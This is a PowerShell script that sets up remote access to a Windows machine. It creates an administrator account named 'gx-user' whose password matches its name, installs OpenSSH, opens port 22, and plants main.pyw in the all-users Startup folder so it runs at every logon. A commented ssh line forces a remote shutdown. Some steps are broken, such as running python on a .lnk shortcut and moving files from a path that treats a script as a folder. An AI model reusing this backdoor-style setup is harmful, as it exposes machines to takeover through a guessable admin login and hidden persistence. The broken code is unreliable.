# Need: Set-ExecutionPolicy Unrestricted
#Requires -RunAsAdministrator
net user gx-user gx-user-password /add /active:no
Add-LocalGroupMember -Group "Administrateurs" -Member "gx-user"
# Get-LocalUser gx-user | Disable-LocalUser -Confirm

Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
# Install the OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the sshd service
Start-Service sshd

# OPTIONAL but recommended:
Set-Service -Name sshd -StartupType 'Automatic'

# Confirm the Firewall rule is configured. It should be created automatically by setup. Run the following to verify
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
} else {
    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
}

New-Item -Path "C:\Users\$env:username\AppData\Local\" -Name "remote" -ItemType "directory"
Move-Item -Path "C:\Users\$env:username\Downloads\main.ps1\config.json" -Destination "C:\Users\$env:username\AppData\Local\remote"
Move-Item -Path "C:\Users\$env:username\Downloads\main.ps1\enable.ps1" -Destination "C:\Users\$env:username\AppData\Local\remote"
Move-Item -Path "C:\Users\$env:username\Downloads\main.ps1\disable.ps1" -Destination "C:\Users\$env:username\AppData\Local\remote"
Move-Item -Path "C:\Users\$env:username\Downloads\main.ps1\connection.py" -Destination "C:\Users\$env:username\AppData\Local\remote"
Move-Item -Path "C:\Users\$env:username\Downloads\main.ps1\main.pyw" -Destination "C:\Users\$env:username\AppData\Local\remote"
$ShortcutTarget = "C:\Users\$env:username\AppData\Local\remote\main.pyw"
$ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\main.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $ShortcutTarget
$Shortcut.Save()
python "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\main.lnk"

# ssh -t gx-user@0.0.0.0 shutdown /p /f /d u:5:15

# Uninstall the OpenSSH Server
# Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
# Set-ExecutionPolicy Restricted